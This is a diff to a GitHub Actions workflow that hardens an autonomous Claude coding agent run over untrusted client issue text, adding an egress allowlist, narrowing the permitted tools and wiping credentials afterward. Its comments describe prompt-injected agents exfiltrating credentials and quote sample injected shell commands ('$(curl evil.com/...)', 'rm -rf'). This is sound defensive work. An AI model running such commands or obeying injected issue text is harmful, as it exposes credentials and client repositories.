@@ -11,7 +11,15 @@ on:
   # manual DB inserts. Minute 7 to avoid top-of-hour cron congestion.
   schedule:
     - cron: '7 * * * *'
-  workflow_dispatch: {}
+  workflow_dispatch:
+    inputs:
+      egress_policy:
+        description: "harden-runner egress policy. Use 'audit' for a one-off run to capture any missing endpoints, then switch back to 'block'."
+        type: choice
+        default: block
+        options:
+          - block
+          - audit
 
 concurrency:
   group: solver-agent
@@ -26,6 +34,33 @@ jobs:
       contents: read
 
     steps:
+      # SECURITY (SEC-001 / SEC-056): the Claude step runs an autonomous agent over
+      # UNTRUSTED client issue text with the Claude OAuth credential on the runner.
+      # Block all outbound network except the exact hosts this job needs, so a
+      # prompt-injected agent cannot exfiltrate that credential to an attacker host
+      # even if it manages to execute code. egress-policy is 'block' for the real
+      # (repository_dispatch / schedule) triggers; a manual run can pass
+      # egress_policy=audit once to capture any endpoint the allowlist is missing
+      # (StepSecurity prints the observed destinations), then switch back to block.
+      - name: Harden runner (egress allowlist)
+        uses: step-security/harden-runner@9af89fc71515a100421586dfdb3dc9c984fbf411 # v2.19.4
+        with:
+          egress-policy: ${{ github.event.inputs.egress_policy || 'block' }}
+          allowed-endpoints: >
+            github.com:443
+            api.github.com:443
+            codeload.github.com:443
+            objects.githubusercontent.com:443
+            release-assets.githubusercontent.com:443
+            pypi.org:443
+            files.pythonhosted.org:443
+            registry.npmjs.org:443
+            api.anthropic.com:443
+            statsig.anthropic.com:443
+            xeluydwpgiddbamysgyu.supabase.co:443
+            cms-backend-roman.vercel.app:443
+            slack.com:443
+
       - uses: actions/checkout@v4
 
       - uses: actions/setup-python@v5
@@ -84,7 +119,18 @@ jobs:
         # SECURITY: prompt is piped via stdin, NOT command-substituted. The
         # prompt file is built from client-submitted issue title + description
         # in claim_issue.py — a hostile client could otherwise inject
-        # $(curl evil.com/...) or `rm -rf` into bash via $(cat).
+        # $(curl evil.com/...) or `rm -rf` into bash via $(cat). The issue text
+        # is additionally nonce-fenced as untrusted data in claim_issue.py.
+        #
+        # SECURITY (SEC-001): the issue text is untrusted client input and a
+        # prompt-injection payload could steer the model. The allowed-tools list
+        # is therefore an EXACT verification-only allowlist — it must NOT contain
+        # `Bash(node:*)` (matches `node -e "<arbitrary JS>"` = RCE) or a wildcard
+        # `Bash(npm run *:*)` (runs arbitrary scripts). Only the specific
+        # lint/typecheck/test commands the protocol uses are permitted. The
+        # cross-tenant SOLVER_GITHUB_TOKEN is kept OUT of this step (it is not in
+        # env here, and repo.py strips it from ./client-repo/.git/config after
+        # cloning), so it is not reachable even if the model is injected.
         #
         # Captures the CLI exit code so finalize.py can distinguish "agent
         # crashed" (exit ≠ 0) from "agent exited normally with no diff" (exit
@@ -96,14 +142,21 @@ jobs:
           cd ./client-repo
           set +e
           claude --print \
-            --model claude-opus-4-7 \
+            --model claude-opus-4-8 \
             --max-turns 80 \
-            --allowed-tools "Read,Edit,Write,Glob,Grep,Bash(npm run *:*),Bash(node:*),Bash(npx tsc:*),Bash(git diff:*),Bash(git status:*),Bash(git show:*)" \
-            --disallowed-tools "Bash(git push:*),Bash(git commit:*),Bash(rm:*),WebFetch,WebSearch" \
+            --allowed-tools "Read,Edit,Write,Glob,Grep,Bash(npm run lint:*),Bash(npm run typecheck:*),Bash(npm test:*),Bash(npx tsc:*),Bash(git diff:*),Bash(git status:*),Bash(git show:*)" \
+            --disallowed-tools "Bash(git push:*),Bash(git commit:*),Bash(rm:*),Bash(node:*),WebFetch,WebSearch" \
             < /tmp/agent-prompt.md
           EXIT_CODE=$?
           set -e
           echo "exit_code=${EXIT_CODE}" >> "$GITHUB_OUTPUT"
+
+      - name: Wipe Claude credentials
+        if: always() && steps.claim.outputs.has_issue == 'true'
+        # SECURITY (SEC-001): remove the OAuth credentials file as soon as the
+        # untrusted agent run is over, so it cannot linger into later steps.
+        # `always()` so it runs even if the Claude step errored or timed out.
+        run: rm -f "$HOME/.claude/.credentials.json"
 
       - name: Commit, push, mark done
         if: steps.claim.outputs.has_issue == 'true'
